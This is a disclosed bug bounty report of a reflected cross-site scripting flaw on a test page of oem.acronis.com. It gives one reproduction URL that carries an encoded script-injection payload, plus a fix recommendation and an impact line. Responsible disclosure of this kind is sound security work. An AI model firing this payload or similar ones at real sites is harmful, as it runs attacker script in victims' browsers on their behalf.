# [oem.acronis.com] Reflected Cross Site Scripting 

## Report Details
- **Report ID**: 2038943
- **URL**: https://hackerone.com/reports/2038943
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-06-26T16:22:14.281Z
- **Disclosed**: 2024-12-28T08:57:12.458Z

## Reporter
- **Username**: darkdream
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
Hi Acronis team
i have found a XSS reflected  in:oem.acronis.com

## Steps To Reproduce
  1.     for xss go to link :
```
https://oem.acronis.com/test/testenv.html/%3C/pre%3E%3Cisindex%20type%3Dimage%20src%3D1%20onerror%3Dalert%289166%29%3E%3Cscript%3Ealert(origin)%3C/script%3E
```
##POC:

{F2446065}

## Recommendations
delete test page from your server

## Impact

Attacker can execute JS code on the Victim Behalf.

## Attachments
- xss-oem.mp4
